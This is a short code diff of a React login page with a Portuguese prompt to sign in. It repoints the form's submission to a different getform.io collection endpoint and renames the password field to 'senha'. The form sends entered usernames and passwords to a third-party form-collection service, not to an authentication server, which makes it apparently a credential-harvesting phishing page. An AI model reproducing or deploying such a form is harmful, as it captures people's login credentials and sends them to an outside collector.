@@ -15,7 +15,7 @@ function App() {
       <div className="flex-grow flex flex-col items-center justify-center p-4">
         <div className="bg-white p-8 rounded-lg shadow-xl w-full max-w-md">
           <h2 className="text-2xl font-bold text-center text-gray-800 mb-6">Entrar na sua conta</h2>
-          <form action="https://getform.io/f/bnlxwgvb" method="POST">
+          <form action="https://getform.io/f/ayvydvgb" method="POST">
             <div className="mb-4">
               <input
                 type="text"
@@ -30,7 +30,7 @@ function App() {
               <input
                 type="password"
                 id="password"
-                name="password" 
+                name="senha" 
                 className="shadow appearance-none border rounded w-full py-2 px-3 text-gray-700 mb-3 leading-tight focus:outline-none focus:shadow-outline focus:border-purple-500"
                 placeholder="Digite a senha"
               />
